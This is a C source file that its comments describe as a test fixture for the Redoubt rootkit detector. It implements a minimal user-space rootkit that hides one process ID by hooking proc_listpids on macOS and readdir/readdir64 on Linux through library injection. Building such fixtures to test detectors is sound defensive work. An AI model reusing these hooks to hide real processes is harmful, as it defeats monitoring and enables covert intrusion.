/* SPDX-License-Identifier: MIT
 *
 * DEMO / TEST FIXTURE - a deliberately minimal user-space "rootkit".
 *
 * It hides ONE process id (taken from $HIDE_PID) from directory / process
 * listings of any program it is injected into, exactly the way user-space
 * rootkits (LD_PRELOAD on Linux, DYLD_INSERT_LIBRARIES on macOS) hide things.
 * It cannot hide from anything that does not go through the hooked call, which
 * is precisely what Redoubt's cross-view checks exploit.
 *
 * It does nothing else: no persistence, no network, no privilege changes, and
 * it only affects a process you start with the environment variable set.
 *
 *   macOS:  HIDE_PID=<pid> DYLD_INSERT_LIBRARIES=build/libhide.dylib ./redoubt scan
 *   Linux:  HIDE_PID=<pid> LD_PRELOAD=build/libhide.so             ./redoubt scan
 */
#if defined(__linux__) && !defined(_GNU_SOURCE)
#define _GNU_SOURCE
#endif
#include <stdlib.h>
#include <string.h>

#if defined(__APPLE__)

#include <libproc.h>
#include <sys/types.h>

static int hooked_proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize) {
    int n = proc_listpids(type, typeinfo, buffer, buffersize); /* calls the real one: interposing is not recursive */
    const char *h = getenv("HIDE_PID");
    if (!buffer || n <= 0 || !h || !*h) return n;
    pid_t hide = (pid_t)strtol(h, NULL, 10);
    pid_t *ids = buffer;
    int count = n / (int)sizeof(pid_t), w = 0;
    for (int i = 0; i < count; i++)
        if (ids[i] != hide) ids[w++] = ids[i];
    return w * (int)sizeof(pid_t);
}

typedef struct {
    const void *replacement;
    const void *replacee;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[] __attribute__((section("__DATA,__interpose"))) = {
    {(const void *)hooked_proc_listpids, (const void *)proc_listpids},
};

#elif defined(__linux__)

#include <dirent.h>
#include <dlfcn.h>

static int is_hidden_name(const char *name) {
    const char *h = getenv("HIDE_PID");
    return h && *h && strcmp(name, h) == 0;
}

struct dirent *readdir(DIR *d) {
    static struct dirent *(*real)(DIR *);
    if (!real) real = (struct dirent * (*)(DIR *)) dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(d)) && is_hidden_name(e->d_name)) {
    }
    return e;
}

struct dirent64 *readdir64(DIR *d) {
    static struct dirent64 *(*real)(DIR *);
    if (!real) real = (struct dirent64 * (*)(DIR *)) dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real(d)) && is_hidden_name(e->d_name)) {
    }
    return e;
}

#endif
